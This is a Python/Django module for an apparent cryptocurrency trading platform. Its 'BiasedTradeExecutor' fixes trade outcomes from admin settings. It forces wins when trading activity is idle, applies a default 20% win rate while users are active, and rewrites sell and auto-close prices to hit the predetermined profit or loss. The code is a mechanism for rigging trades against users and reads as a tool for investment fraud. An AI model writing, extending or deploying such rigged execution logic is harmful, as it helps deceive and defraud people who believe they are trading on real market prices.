"""
Biased trade execution system controlled by admin settings
"""
import random
from decimal import Decimal
from datetime import timedelta
from django.utils import timezone
from django.db import transaction

from .trade_execution import TradeExecutor
from admin_control.models import TradingSettings, UserTradeOutcome


class BiasedTradeExecutor(TradeExecutor):
    """
    Trade executor with admin-controlled outcomes
    Extends TradeExecutor with biased profit/loss logic
    """
    
    def __init__(self, user):
        super().__init__(user)
        self.settings = TradingSettings.get_active_settings()
    
    def determine_trade_outcome(self):
        """
        Determine if trade will be a win or loss based on admin settings
        Returns: (outcome, percentage, duration_seconds)
        
        Activity-based logic:
        - IDLE MODE: No trades in last 10 min → Always WIN with configured profit in 30 min
        - ACTIVE MODE: Recent trades exist → Win based on probability (default 20% win rate)
        """
        # Check if biased trading is enabled
        if not self.settings.is_active:
            # Return neutral outcome
            return ('neutral', Decimal('0'), 60)
        
        # Check if users are actively trading
        is_active = TradingSettings.is_user_actively_trading()
        
        if is_active:
            # ACTIVE MODE: Users are trading → Use probability-based outcome
            # Generate random number 0-100 to compare with win rate
            random_chance = random.uniform(0, 100)
            
            if random_chance <= float(self.settings.active_win_rate_percentage):
                # WIN in active mode
                outcome = 'win'
                percentage = self.settings.active_profit_percentage
            else:
                # LOSS in active mode
                outcome = 'loss'
                percentage = self.settings.active_loss_percentage
            
            duration_seconds = self.settings.active_duration_seconds
        else:
            # IDLE MODE: No active trading → Force WIN
            outcome = 'win'
            percentage = self.settings.idle_profit_percentage
            duration_seconds = self.settings.idle_duration_seconds
        
        return (outcome, percentage, duration_seconds)
    
    def execute_biased_buy_order(self, cryptocurrency_symbol, amount, price, leverage=1):
        """
        Execute a buy order with predetermined outcome
        """
        # First execute normal buy order
        trade = super().execute_buy_order(cryptocurrency_symbol, amount, price, leverage)
        
        # Determine outcome
        outcome, percentage, duration = self.determine_trade_outcome()
        
        # Calculate target close time
        target_close_time = timezone.now() + timedelta(seconds=duration)
        
        # Create outcome record
        trade_outcome = UserTradeOutcome.objects.create(
            user=self.user,
            trade=trade,
            outcome=outcome,
            outcome_percentage=percentage,
            duration_seconds=duration,
            target_close_time=target_close_time
        )
        
        return trade, trade_outcome
    
    def execute_biased_sell_order(self, cryptocurrency_symbol, amount, price, leverage=1):
        """
        Execute a sell order with biased profit/loss based on admin settings
        """
        # Get predetermined outcome if it exists
        try:
            # Find the most recent buy trade for this crypto
            from trades.models import Trade
            last_buy = Trade.objects.filter(
                user=self.user,
                cryptocurrency__symbol=cryptocurrency_symbol,
                trade_type='buy',
                status='executed'
            ).order_by('-executed_at').first()
            
            if last_buy and hasattr(last_buy, 'outcome'):
                outcome_record = last_buy.outcome
                
                # Apply the predetermined outcome
                if outcome_record.outcome == 'win':
                    # Calculate winning exit price
                    target_profit_percentage = outcome_record.outcome_percentage / 100
                    adjusted_price = last_buy.price * (1 + target_profit_percentage)
                    price = adjusted_price
                    
                elif outcome_record.outcome == 'loss':
                    # Calculate losing exit price
                    target_loss_percentage = outcome_record.outcome_percentage / 100
                    adjusted_price = last_buy.price * (1 - target_loss_percentage)
                    price = adjusted_price
                
                # Mark outcome as executed
                outcome_record.is_executed = True
                outcome_record.executed_at = timezone.now()
                outcome_record.save()
        
        except Exception as e:
            print(f"Error applying biased outcome: {e}")
            # Continue with normal execution
        
        # Execute sell order with potentially adjusted price
        trade = super().execute_sell_order(cryptocurrency_symbol, amount, price, leverage)
        
        return trade
    
    def auto_close_due_trades(self):
        """
        Automatically close trades that have reached their target close time
        Should be called by a background task
        """
        from trades.models import Trade
        
        # Get all non-executed outcomes that are due
        due_outcomes = UserTradeOutcome.objects.filter(
            is_executed=False,
            target_close_time__lte=timezone.now()
        )
        
        closed_trades = []
        
        for outcome in due_outcomes:
            try:
                if outcome.trade and outcome.trade.trade_type == 'buy':
                    # Auto-close the position
                    cryptocurrency_symbol = outcome.trade.cryptocurrency.symbol
                    amount = outcome.trade.amount
                    
                    # Calculate exit price based on outcome
                    if outcome.outcome == 'win':
                        exit_price = outcome.trade.price * (1 + outcome.outcome_percentage / 100)
                    else:
                        exit_price = outcome.trade.price * (1 - outcome.outcome_percentage / 100)
                    
                    # Execute the sell
                    sell_trade = self.execute_sell_order(
                        cryptocurrency_symbol,
                        str(amount),
                        str(exit_price),
                        outcome.trade.leverage
                    )
                    
                    # Mark as executed
                    outcome.is_executed = True
                    outcome.executed_at = timezone.now()
                    outcome.save()
                    
                    closed_trades.append(sell_trade)
            
            except Exception as e:
                print(f"Error auto-closing trade {outcome.id}: {e}")
                continue
        
        return closed_trades
    
    def get_user_active_positions(self):
        """
        Get user's active positions with their target outcomes
        """
        from trades.models import Trade
        
        active_trades = Trade.objects.filter(
            user=self.user,
            status='executed',
            trade_type='buy'
        ).exclude(
            id__in=Trade.objects.filter(
                user=self.user,
                trade_type='sell',
                status='executed'
            ).values_list('id', flat=True)
        )
        
        positions = []
        for trade in active_trades:
            try:
                outcome = trade.outcome
                positions.append({
                    'trade_id': trade.id,
                    'cryptocurrency': trade.cryptocurrency.symbol,
                    'amount': float(trade.amount),
                    'entry_price': float(trade.price),
                    'leverage': trade.leverage,
                    'expected_outcome': outcome.outcome,
                    'expected_percentage': float(outcome.outcome_percentage),
                    'target_close_time': outcome.target_close_time.isoformat(),
                    'seconds_remaining': (outcome.target_close_time - timezone.now()).total_seconds(),
                })
            except:
                # No outcome record (shouldn't happen with biased system)
                positions.append({
                    'trade_id': trade.id,
                    'cryptocurrency': trade.cryptocurrency.symbol,
                    'amount': float(trade.amount),
                    'entry_price': float(trade.price),
                    'leverage': trade.leverage,
                    'expected_outcome': 'unknown',
                })
        
        return positions

